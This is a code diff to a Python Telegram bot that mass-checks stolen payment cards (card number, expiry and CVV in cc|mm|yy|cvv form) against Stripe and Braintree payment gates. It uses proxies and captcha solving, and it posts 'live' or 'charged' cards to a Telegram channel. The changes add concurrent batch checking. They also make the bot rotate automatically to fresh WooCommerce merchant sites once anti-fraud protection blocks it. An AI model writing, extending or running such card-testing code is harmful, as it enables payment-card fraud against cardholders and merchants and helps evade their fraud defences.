@@ -65,6 +65,7 @@ def _enable_aiogram_v2_style_handlers(dp):
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from proxy_scraper import full_scrape_and_scrub, auto_scrub_loop, get_scrub_stats, get_scrubbed_proxies, proxy_pool_monitor, get_live_count, remove_dead_proxy, get_proxy_latency, TARGET_LIVE, REFILL_THRESHOLD, MAX_WORKERS
 from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ADMIN_CODE, TELEGRAM_ADMIN, STRIPE_PUB_KEY, get_proxy_dict, load_proxies, get_proxy_stats, get_pool_size, blacklist_proxy, clear_blacklist, set_gate_setting, get_all_gate_settings, is_gate_enabled, set_gate_enabled, get_notify, set_notify, get_all_notify, set_custom_chat_id, get_custom_chat_id, is_proxy_enabled, set_proxy_enabled, add_custom_proxy, remove_custom_proxy, get_custom_proxies, clear_custom_proxies, has_custom_proxies, get_config, get_all_configs, get_active_config_id, set_active_config, create_config, duplicate_config, delete_config, enable_config, disable_config, set_config_setting, set_config_name, get_config_stats, update_config_stats, get_enabled_configs, is_parallel_enabled, set_parallel_enabled, config_count, generate_redeem_key, redeem_key, get_all_redeem_keys, revoke_redeem_key, is_user_redeemed, cleanup_expired_keys, add_admin, remove_admin, get_all_admins, is_extra_admin, get_config_gate_type, set_config_gate_type, get_gate_setting, track_user_card, get_user_cards, get_user_card_file, clear_user_cards, get_user_check_count, increment_user_check_count, check_user_card_limit, get_user_limit, set_user_limit, get_all_user_limits, export_config_data, import_config_data, get_captcha_setting, set_captcha_setting, get_all_captcha_settings, is_captcha_enabled, CAPTCHA_SETTINGS, ALL_GATE_TYPES, GATE_TYPE_LABELS, GATE_TYPE_ALIASES
+from config import increment_config_error, reset_config_errors, ROTATE_AFTER_ERRORS, STRIPE_WC_SITE_POOL, BRAINTREE_WC_SITE_POOL
 from captcha_solver import get_solver_stats, reset_solver_stats, CAPTCHA_TYPES
 from stripe import get_rate_limiter, diagnose_gate, setup_gate_from_url, detect_gate_type
 from braintree_gate import check_braintree, setup_braintree_from_url
@@ -2964,158 +2965,203 @@ def register_handlers(dp):
 
     async def _run_mass_check(bot_inst, chat_id, uid, cards, gate_choice, crawler):
         PHOTO_PATH = os.path.join(BASE_DIR, "scrap.jpg")
+        BULK_SIZE = 3  # concurrent cards per batch (single-gate mode only)
         mc_stats = {'checked': 0, 'live': 0, 'dead': 0, 'errors': 0, 'charged': 0, 'auth': 0}
         approved_cards = []
+
+        gates_to_run = (
+            ["stripe"] if gate_choice == "stripe" else
+            ["braintree"] if gate_choice == "braintree" else
+            ["stripe", "braintree"]
+        )
+        _single_gate = len(gates_to_run) == 1
+
+        async def _mc_check_one(card_str, gt):
+            """Run a single card check and return a normalised result tuple."""
+            pts = card_str.strip().split('|')
+            if len(pts) < 4:
+                return card_str, gt, None
+            cc2, mm2, yy2, cvv2 = pts[0], pts[1], pts[2], pts[3]
+            try:
+                if crawler:
+                    res = await crawler.check_card(card_str, gate_type=gt)
+                    return card_str, gt, res  # (is_live, tag, detail, gate_name, proxy_used, check_time)
+                else:
+                    loop2 = asyncio.get_running_loop()
+                    t0 = time.time()
+                    if gt == "braintree":
+                        raw = await loop2.run_in_executor(None, check_braintree, cc2, mm2, yy2, cvv2)
+                    else:
+                        from stripe import check_stripe as _chk
+                        raw = await loop2.run_in_executor(None, _chk, cc2, mm2, yy2, cvv2)
+                    ct = time.time() - t0
+                    stat = raw.get('status', 'declined')
+                    il = stat in ('live', 'charged')
+                    tg = "CHARGED" if stat == 'charged' else ("LIVE" if il else "DEAD")
+                    return card_str, gt, (il, tg, raw.get('detail', 'Unknown'), raw.get('gate', gt.title()), None, ct)
+            except Exception as exc:
+                logger.error(f"MC check error: {exc}")
+                return card_str, gt, None
+
+        async def _mc_process(card_str, gt, res_tuple):
+            """Handle one check result: update stats, send messages."""
+            pts = card_str.strip().split('|')
+            cc2 = pts[0] if len(pts) >= 4 else ''
+            mc_stats['checked'] += 1
+            SESSION_STATS['total_checked'] += 1
+            increment_user_check_count(uid)
+
+            if res_tuple is None:
+                mc_stats['errors'] += 1
+                SESSION_STATS['total_errors'] += 1
+                track_user_card(uid, f"{card_str} | ERROR", "error")
+                mc_stats['dead'] += 1
+                SESSION_STATS['total_dead'] += 1
+                return False
+
+            is_live, tag, detail, gate_name, proxy_used, check_time = res_tuple
+            proxy_display = proxy_used if proxy_used else "DIRECT"
+            gt_label = "Stripe" if gt == "stripe" else "Braintree"
+
+            if is_live:
+                mc_stats['live'] += 1
+                if tag == "CHARGED":
+                    mc_stats['charged'] += 1
+                    SESSION_STATS['charged'] += 1
+                auth_type, _ = _classify_auth_type(tag, detail)
+                if "AUTH" in auth_type and tag != "CHARGED":
+                    mc_stats['auth'] = mc_stats.get('auth', 0) + 1
+                SESSION_STATS['total_live'] += 1
+
+                bin_info = await safe_bin_info(crawler, cc2[:6])
+                live_message = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, " [MC]", check_time)
+                keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="💎 H@0", url="https://t.me/historyindaysd")]
+                ])
+
+                active_chat2 = get_active_chat_id()
+                if get_notify("live") and active_chat2:
+                    for send_attempt in range(3):
+                        try:
+                            if os.path.exists(PHOTO_PATH):
+                                await bot_inst.send_photo(active_chat2, photo=InputFile(PHOTO_PATH), caption=live_message, reply_markup=keyboard, parse_mode='HTML')
+                            else:
+                                await bot_inst.send_message(active_chat2, live_message, reply_markup=keyboard, parse_mode='HTML')
+                            break
+                        except Exception as se:
+                            err_msg = str(se).lower()
+                            if 'retry after' in err_msg or 'too many requests' in err_msg:
+                                await asyncio.sleep(10)
+                            elif send_attempt == 2:
+                                logger.error(f"MC channel send failed: {se}")
+                            else:
+                                await asyncio.sleep(2)
+
+                try:
+                    await bot_inst.send_message(chat_id, live_message, parse_mode='HTML')
+                except Exception:
+                    pass
+
+                approved_cards.append(card_str)
+                track_user_card(uid, card_str, "live")
+                logger.info(f"[MC-LIVE] {cc2[:6]}*** | {gt_label} | {detail[:40]}")
+                return True
+            else:
+                mc_stats['dead'] += 1
+                SESSION_STATS['total_dead'] += 1
+                logger.info(f"[MC-DEAD] {cc2[:6]}*** | {gt_label} | {detail[:40]}")
+                track_user_card(uid, f"{card_str} | {gt_label}: {detail[:60]}", "error")
+                return False
 
         try:
             active_chat = get_active_chat_id()
             is_admin_user = is_admin(int(uid), None)
 
-            for i, card_str in enumerate(cards):
-                if _mass_check_cancel.get(uid):
-                    break
+            if _single_gate:
+                # ── concurrent mode: BULK_SIZE cards at once ─────────────
+                _mc_gt = gates_to_run[0]
+                for batch_start in range(0, len(cards), BULK_SIZE):
+                    if _mass_check_cancel.get(uid):
+                        break
+                    if not is_admin_user:
+                        allowed, _ = check_user_card_limit(uid)
+                        if not allowed:
+                            try:
+                                await bot_inst.send_message(chat_id, "<b>⚠️  DAILY LIMIT REACHED</b>\n━━━━━━━━━━━━━━━━━━━━\n\nMass check stopped.\n\n<code>━━ H@0 ━━</code>", parse_mode='HTML')
+                            except Exception:
+                                pass
+                            break
 
-                if not is_admin_user:
-                    allowed, remaining = check_user_card_limit(uid)
-                    if not allowed:
+                    chunk = cards[batch_start:batch_start + BULK_SIZE]
+                    batch_results = await asyncio.gather(
+                        *[_mc_check_one(c, _mc_gt) for c in chunk],
+                        return_exceptions=True
+                    )
+                    for item in batch_results:
+                        if isinstance(item, Exception):
+                            mc_stats['errors'] += 1
+                            SESSION_STATS['total_errors'] += 1
+                            continue
+                        _cs, _gt, _res = item
+                        await _mc_process(_cs, _gt, _res)
+
+                    if mc_stats['checked'] % 10 < BULK_SIZE or batch_start == 0:
                         try:
                             await bot_inst.send_message(
                                 chat_id,
-                                f"<b>⚠️  DAILY LIMIT REACHED</b>\n"
-                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
-                                f"Daily card limit reached at card {i+1}.\n"
-                                f"Mass check stopped.\n\n"
-                                f"<code>━━ H@0 ━━</code>",
+                                f"📦 <b>MC Progress</b>: <code>{mc_stats['checked']}/{len(cards)}</code> · ✅ <code>{mc_stats['live']}</code> · ❌ <code>{mc_stats['dead']}</code>",
                                 parse_mode='HTML'
                             )
                         except Exception:
                             pass
-                        break
 
-                pts = card_str.strip().split('|')
-                if len(pts) < 4:
-                    continue
-                cc, mm, yy, cvv = pts[0], pts[1], pts[2], pts[3]
+                    await asyncio.sleep(0.5)
 
-                gates_to_run = []
-                if gate_choice == "stripe":
-                    gates_to_run = ["stripe"]
-                elif gate_choice == "braintree":
-                    gates_to_run = ["braintree"]
-                else:
-                    gates_to_run = ["stripe", "braintree"]
-
-                card_is_live = False
-                for gt in gates_to_run:
+            else:
+                # ── sequential mode: try all gates per card (stop on LIVE) ─
+                for i, card_str in enumerate(cards):
                     if _mass_check_cancel.get(uid):
                         break
-                    try:
-                        check_time = None
-                        if crawler:
-                            is_live, tag, detail, gate_name, proxy_used, check_time = await crawler.check_card(card_str, gate_type=gt)
-                        else:
-                            t0 = time.time()
-                            if gt == "braintree":
-                                loop = asyncio.get_running_loop()
-                                result = await loop.run_in_executor(None, check_braintree, cc, mm, yy, cvv)
-                            else:
-                                from stripe import check_stripe as _chk
-                                loop = asyncio.get_running_loop()
-                                result = await loop.run_in_executor(None, _chk, cc, mm, yy, cvv)
-                            check_time = time.time() - t0
-                            status = result.get('status', 'declined')
-                            detail = result.get('detail', 'Unknown')
-                            gate_name = result.get('gate', gt.title())
-                            is_live = status in ('live', 'charged')
-                            tag = "CHARGED" if status == 'charged' else ("LIVE" if is_live else "DEAD")
-                            proxy_used = None
-
-                        proxy_display = proxy_used if proxy_used else "DIRECT"
-                        gt_label = "Stripe" if gt == "stripe" else "Braintree"
-
-                        if is_live:
-                            card_is_live = True
-                            mc_stats['live'] += 1
-                            if tag == "CHARGED":
-                                mc_stats['charged'] += 1
-                            auth_type, _ = _classify_auth_type(tag, detail)
-                            if "AUTH" in auth_type and tag != "CHARGED":
-                                mc_stats.setdefault('auth', 0)
-                                mc_stats['auth'] += 1
-                            SESSION_STATS['total_live'] += 1
-                            if tag == "CHARGED":
-                                SESSION_STATS['charged'] += 1
-
-                            bin_info = await safe_bin_info(crawler, cc[:6])
-                            live_message = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, f" [MC]", check_time)
-
-                            keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                                [InlineKeyboardButton(text="💎 H@0", url="https://t.me/historyindaysd")]
-                            ])
-
-                            if get_notify("live") and active_chat:
-                                for send_attempt in range(3):
-                                    try:
-                                        if os.path.exists(PHOTO_PATH):
-                                            await bot_inst.send_photo(
-                                                active_chat,
-                                                photo=InputFile(PHOTO_PATH),
-                                                caption=live_message,
-                                                reply_markup=keyboard,
-                                                parse_mode='HTML'
-                                            )
-                                        else:
-                                            await bot_inst.send_message(active_chat, live_message, reply_markup=keyboard, parse_mode='HTML')
-                                        break
-                                    except Exception as e:
-                                        err_msg = str(e).lower()
-                                        if 'retry after' in err_msg or 'too many requests' in err_msg:
-                                            await asyncio.sleep(10)
-                                        elif send_attempt == 2:
-                                            logger.error(f"MC channel send failed: {e}")
-                                        else:
-                                            await asyncio.sleep(2)
-
+                    if not is_admin_user:
+                        allowed, remaining = check_user_card_limit(uid)
+                        if not allowed:
                             try:
-                                chk_msg = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, f" [MC]", check_time)
-                                await bot_inst.send_message(chat_id, chk_msg, parse_mode='HTML')
+                                await bot_inst.send_message(
+                                    chat_id,
+                                    f"<b>⚠️  DAILY LIMIT REACHED</b>\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
+                                    f"Daily card limit reached at card {i+1}.\n"
+                                    f"Mass check stopped.\n\n"
+                                    f"<code>━━ H@0 ━━</code>",
+                                    parse_mode='HTML'
+                                )
                             except Exception:
                                 pass
-
-                            approved_cards.append(card_str)
-                            track_user_card(uid, card_str, "live")
-                            logger.info(f"[MC-LIVE] {cc[:6]}*** | {gt_label} | {detail[:40]}")
                             break
-                        else:
-                            logger.info(f"[MC-DEAD] {cc[:6]}*** | {gt_label} | {detail[:40]}")
-                            track_user_card(uid, f"{card_str} | {gt_label}: {detail[:60]}", "error")
 
-                    except Exception as e:
-                        mc_stats['errors'] += 1
-                        SESSION_STATS['total_errors'] += 1
-                        track_user_card(uid, f"{card_str} | ERROR: {str(e)[:60]}", "error")
-                        logger.error(f"MC check error: {e}")
+                    pts = card_str.strip().split('|')
+                    if len(pts) < 4:
+                        continue
 
-                mc_stats['checked'] += 1
-                SESSION_STATS['total_checked'] += 1
-                increment_user_check_count(uid)
-                if not card_is_live:
-                    mc_stats['dead'] += 1
-                    SESSION_STATS['total_dead'] += 1
+                    for gt in gates_to_run:
+                        if _mass_check_cancel.get(uid):
+                            break
+                        _, _, res_tuple = await _mc_check_one(card_str, gt)
+                        got_live = await _mc_process(card_str, gt, res_tuple)
+                        if got_live:
+                            break
 
-                if mc_stats['checked'] % 10 == 0:
-                    try:
-                        progress = (
-                            f"📦 <b>MC Progress</b>: "
-                            f"<code>{mc_stats['checked']}/{len(cards)}</code> · "
-                            f"✅ <code>{mc_stats['live']}</code> · "
-                            f"❌ <code>{mc_stats['dead']}</code>"
-                        )
-                        await bot_inst.send_message(chat_id, progress, parse_mode='HTML')
-                    except Exception:
-                        pass
+                    if mc_stats['checked'] % 10 == 0:
+                        try:
+                            await bot_inst.send_message(
+                                chat_id,
+                                f"📦 <b>MC Progress</b>: <code>{mc_stats['checked']}/{len(cards)}</code> · ✅ <code>{mc_stats['live']}</code> · ❌ <code>{mc_stats['dead']}</code>",
+                                parse_mode='HTML'
+                            )
+                        except Exception:
+                            pass
 
-                await asyncio.sleep(1)
+                    await asyncio.sleep(1)
 
             if approved_cards:
                 try:
@@ -5427,6 +5473,12 @@ async def checking_loop(bot, chat_id, crawler):
                             cooldown = random.uniform(15, 30) if is_blocked else random.uniform(8, 15)
                             logger.warning(f"API protection triggered ({err_type}): {detail[:50]} - backing off {cooldown:.0f}s")
                             await asyncio.sleep(cooldown)
+                            # Auto-rotate to a fresh site after ROTATE_AFTER_ERRORS consecutive blocks
+                            if is_blocked:
+                                err_cnt = increment_config_error(check_cid)
+                                if err_cnt >= ROTATE_AFTER_ERRORS:
+                                    asyncio.create_task(_rotate_config_site(check_cid, cfg_gate_type))
+                                    reset_config_errors(check_cid)
                         elif is_network:
                             await asyncio.sleep(random.uniform(3, 8))
 
@@ -5437,6 +5489,7 @@ async def checking_loop(bot, chat_id, crawler):
                         continue
 
                     crawler._consecutive_errors = 0
+                    reset_config_errors(check_cid)
                     proxy_display = proxy_used if proxy_used else "DIRECT"
                     logger.info(f"[{tag}] {cc[:6]}*** | {gate_name}{cfg_label} | Proxy: {proxy_display} | {detail[:60]}")
 
@@ -5549,6 +5602,33 @@ async def checking_loop(bot, chat_id, crawler):
             f"RL: {rl_status.get('requests_in_window', 0)}/20 rpm, backoff={rl_status.get('backoff_level', 0)}"
         )
         await asyncio.sleep(CRAWL_INTERVAL)
+
+
+async def _rotate_config_site(config_id, gate_type):
+    """Auto-switch a blocked config to a fresh site from the pool (background task)."""
+    pool = STRIPE_WC_SITE_POOL if "stripe" in gate_type else BRAINTREE_WC_SITE_POOL
+    if not pool:
+        return
+    new_url = random.choice(pool)
+    logger.info(f"[AutoRotate] Config #{config_id} ({gate_type}) → {new_url}")
+    loop = asyncio.get_running_loop()
+    _setup_fn_map = {
+        "stripe": setup_gate_from_url,
+        "stripe_auth": setup_stripe_auth_from_url,
+        "stripe_intent": setup_stripe_intent_from_url,
+        "braintree": setup_braintree_from_url,
+        "braintree_auth": setup_braintree_auth_from_url,
+    }
+    setup_fn = _setup_fn_map.get(gate_type, setup_gate_from_url)
+    try:
+        result = await loop.run_in_executor(None, setup_fn, new_url)
+        if result.get("success"):
+            logger.info(f"[AutoRotate] OK — config #{config_id} now on {new_url}")
+        else:
+            errs = result.get("errors", [])
+            logger.warning(f"[AutoRotate] Setup failed for {new_url}: {errs[:2]}")
+    except Exception as exc:
+        logger.warning(f"[AutoRotate] Error: {exc}")
 
 
 async def main_loop():
